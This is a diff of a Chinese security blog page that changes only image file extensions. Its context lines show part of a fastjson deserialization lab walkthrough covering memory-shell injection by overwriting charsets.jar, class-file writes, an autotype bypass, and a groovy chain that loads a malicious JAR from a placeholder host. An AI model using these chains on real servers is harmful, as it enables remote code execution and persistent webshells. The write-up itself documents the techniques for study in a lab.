 <p>而版本号信息可以通过更新记录，如<a target="_blank" rel="noopener" href="https://github.com/openjdk/jdk8u/tags">jdk8u/tags</a>中获得:</p>
 <pre><code>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.[jdk8u/tags]-[1-10].[el7_9].x86_64/jre/bin/java
 </code></pre>
 <p>这样来看还是大概率遍历到真实路径的。</p>
 <p><em>2.编译charsets.jar</em></p>
 <p>编译覆盖目标环境的<code>charsets.jar</code>时，需要根据目标<code>JDK</code>版本选择<code>maven</code>项目的<code>JDK</code>版本，如靶场环境是<code>JDK8</code>:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603122722482.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603122722482.webp"></p>
 <p>新建一个名为<code>charsets</code>的<code>maven</code>项目, 项目使用探测到的<code>JDK</code>对应版本:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601172829147.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601172829147.webp"></p>
 <p>然后在<a target="_blank" rel="noopener" href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/tree/main/charsets">spring-boot-upload-file-lead-to-rce-tricks</a>项目中将<code>src</code>下的文件复制到项目中:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173247078.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173247078.webp"></p>
 <p>接下来需要准备内存马的注入代码，编写到<code>IBM33722.java</code>这个文件中，使用<a target="_blank" rel="noopener" href="https://github.com/pen4uin/java-memshell-generator">pen4uin/java-memshell-generator</a>内存马生成工具生成一个内存马:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601174016878.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601174016878.webp"></p>
 <p>可以先生成<code>JSP</code>文件，对照编写<code>JAVA</code>代码:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173509512.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173509512.webp"></p>
 <p>在<code>JSP</code>中是将<code>Base64</code>编码的<code>.class</code>字节码还原后进行实例化，所以根据逻辑在<code>IBM33722.java</code>编写对应的<code>JAVA</code>代码:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173830314.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173830314.webp"></p>
 <p>加载内存马代码如下:</p>
 <pre><code class="line-numbers language-java">package sun.nio.cs.ext;
 import java.util.UUID;
@@ -3182,11 +3182,11 @@ public class IBM33722 {
 }
 </code></pre>
 <p>在项目结构中设置工件，主类默认构建<code>jar</code>包:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131154702.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131154702.webp"></p>
 <p>然后将生成的<code>JAR</code>包通过上文的<code>Python</code>代码转为zlib压缩后的Base64字符串。</p>
 <p><em>3.覆盖目标charsets.jar</em></p>
 <p>尝试覆写<code>charsets.jar</code>文件后，响应信息没有抛出异常说明可能成功了:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131856428.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131856428.webp"></p>
 <p><em>4.触发内存马</em></p>
 <p>使用载荷触发字符集解析进行<code>jar</code>加载:</p>
 <pre><code class="line-numbers language-json">{
@@ -3196,18 +3196,18 @@ public class IBM33722 {
     }
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131941631.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240603131941631.webp"></p>
 <p>返回的异常信息似乎已经触发了<code>jar</code>包加载，配置好密码和请求头尝试访问内存马地址，发现可以成功连接:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173933021.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240601173933021.webp"></p>
 <p>接下来可以考虑根据环境目标<code>JDK</code>版本恢复原始<code>charsets.jar</code>文件。</p>
 <p><strong>写Class文件加载</strong></p>
 <p>写Class文件的利用方式需要通过<code>commons.io</code>依赖创建目录以及二进制文件的写入，需要用到<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/tree/main/1268-writefile-no-network">1268-writefile-no-network</a>环境。使用<code>docker build -t 1268wclass . </code>命令构建镜像后启动容器: <code>docker run -d --name 1268wclass -p 18081:80 1268wclass</code>。这种方式是在<code>jre/classes</code>目录下(不存在目录时可以通过对应<code>Payload</code>创建)写入<code>class</code>文件后通过其他方式触发类加载利用，具体的操作步骤如下:</p>
 <p><em>1.枚举JDK目录</em></p>
 <p>这个环境中可以使用之前<code>commons.io</code>依赖的方法枚举目录，有时候如果是通过<code>JAVA</code>绝对路径启动的<code>WEB</code>服务也可以读取<code>file:///proc/self/cmdline</code>获得路径。</p>
 <p>通过脚本枚举<code>file:///usr/lib/jvm/</code>得到目录列表（只有第一个是目录，其他都是符号链接）:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604180703417.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604180703417.webp"></p>
 <p>继续枚举<code>jre</code>中是否存在<code>classes</code>目录:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604181821070.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604181821070.webp"></p>
 <p><em>2.创建目录</em></p>
 <p>检测后发现不存在<code>classes</code>目录，所以通过<code>payload</code>创建目录:</p>
 <pre><code class="line-numbers language-json">{
@@ -3226,7 +3226,7 @@ public class IBM33722 {
  }
 </code></pre>
 <p>发送请求后，继续通过枚举目录的方式发现成功创建了目录:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182008537.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182008537.webp"></p>
 <p><em>3.编写class文件</em></p>
 <p>接下来需要代码，实现类加载器注入内存马:</p>
 <pre><code class="line-numbers language-java">import java.io.IOException;
@@ -3271,9 +3271,9 @@ public class MemberShell implements AutoCloseable {
 }
 </code></pre>
 <p>在不知道目标<code>JDK</code>版本的情况下优先使用低版本<code>JDK</code>，这里使用<code>JDK8</code>将代码编译为<code>class</code>文件<code>javac MemberShell.java</code>，然后再转为<code>zlib</code>压缩和Base64字符串通过<code>JDK8</code>的二进制写入载荷:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185218762.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185218762.webp"></p>
 <p>检查下目录，class文件已经成功写入:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185325250.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185325250.webp"></p>
 <p><em>4.触发class加载</em></p>
 <p>需要使用<code>java.lang.AutoCloseable</code>来绕过<code>autotype</code>的检查进行后续类加载的触发:</p>
 <pre><code class="line-numbers language-json">{
@@ -3282,17 +3282,17 @@ public class MemberShell implements AutoCloseable {
 }
 </code></pre>
 <p>在没写入<code>class</code>之前，发送触发<code>payload</code>：</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182154708.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182154708.webp"></p>
 <p>写入成功之后再触发:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182218342.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604182218342.webp"></p>
 <p>接下来触发内存马加载:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185723356.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185723356.webp"></p>
 <p>成功使用冰蝎连接了内存马:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185946947.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240604185946947.webp"></p>
 <h3 id="4-7-fastjson-1-2-80-groovy"><a href="#4-7-fastjson-1-2-80-groovy" class="headerlink" title="4.7 fastjson-1.2.80-groovy"></a>4.7 fastjson-1.2.80-groovy</h3><p>通过<a target="_blank" rel="noopener" href="https://github.com/lemono0/FastJsonParty/blob/main/1280-groovy">1280-groovy</a>搭建测试环境:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605004133211.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605004133211.webp"></p>
 <p>先制作一个恶意<code>JAR</code>文件，改造<a target="_blank" rel="noopener" href="https://github.com/Lonely-night/fastjsonVul/tree/master/attack">fastjsonVul-attack</a>项目，写入内存马加载代码，生成<code>jar</code>文件:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011235560.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011235560.webp"></p>
 <p>然后将该<code>jar</code>文件存放在<code>WEB</code>服务器中，通过链接访问可以直接下载文件即可。在后续利用时，会发现远程加载地址classpathList可以是<code>jar</code>文件也可以是<code>web</code>目录。如果是<code>WEB</code>目录时，目录结构满足如下:</p>
 <pre><code class="line-numbers language-tex">├─groovy
 │  └─grape
@@ -3303,7 +3303,7 @@ public class MemberShell implements AutoCloseable {
            org.codehaus.groovy.transform.ASTTransformation
 </code></pre>
 <p>只需要在<code>org.codehaus.groovy.transform.ASTTransformation</code>文件中填写需要加载的类文件即可，后续更新时也只需要更新对应的<code>class</code>文件:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605014034340.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605014034340.webp"></p>
 <p>加载过程如下:</p>
 <pre><code>1.访问ASTTransformation文件获取类名称
 http://x.x.x.x/META-INF/services/org.codehaus.groovy.transform.ASTTransformation
@@ -3318,7 +3318,7 @@ http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
     "unit":{}
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011531881.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011531881.webp"></p>
 <p>执行第二步<code>payload</code>触发远程<code>JAR</code>包加载（要进行第二次加载时需要修改下<code>JAR</code>文件名）:</p>
 <pre><code class="line-numbers language-json">{
     "@type":"org.codehaus.groovy.control.ProcessingUnit",
@@ -3329,9 +3329,9 @@ http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
     }
 }
 </code></pre>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011946333.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605011946333.webp"></p>
 <p>执行成功后即可访问内存马:</p>
-<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605012346969.png"></p>
+<p><img src="/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/image-20240605012346969.webp"></p>
 <h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5 参考链接"></a>5 参考链接</h2><h3 id="5-1-简介和基础"><a href="#5-1-简介和基础" class="headerlink" title="5.1 简介和基础"></a>5.1 <strong>简介和基础</strong></h3><p><a target="_blank" rel="noopener" href="https://b1ue.cn/archives.html">归档 - 浅蓝 ‘s blog (b1ue.cn)</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/x5T2fE6knlMW5j9kWwnz8w">fastjson绕过waf的一些技巧 (qq.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://yml-sec.top/2022/02/16/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">Fastjson反序列化漏洞复现分析 (yml-sec.top)</a></p>
@@ -3489,7 +3489,7 @@ http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
 
     #vcomments textarea {
         box-sizing: border-box;
-        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+        background: url("/medias/comment_bg.webp") 100% 100% no-repeat;
     }
 
     #vcomments p {
@@ -3756,7 +3756,7 @@ http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
                 <a href="/2024/12/04/phpfilters-he-cve-2024-2961-cong-wen-jian-du-qu-dao-rce/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="PHP filters和CVE-2024-2961组合:从文件读取到RCE">
+                        <img src="/medias/featureimages/2.webp" class="responsive-img" alt="PHP filters和CVE-2024-2961组合:从文件读取到RCE">
                         
                         <span class="card-title">PHP filters和CVE-2024-2961组合:从文件读取到RCE</span>
                     </div>
@@ -3804,7 +3804,7 @@ http://x.x.x.x/groovy/grape/GrabAnnotationTransformation2.class
                 <a href="/2022/08/29/li-yong-azureattestservice-chi-jiu-hua/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="利用Azure Attest Service持久化">
+                        <img src="/medias/featureimages/17.webp" class="responsive-img" alt="利用Azure Attest Service持久化">
                         
                         <span class="card-title">利用Azure Attest Service持久化</span>
                     </div>
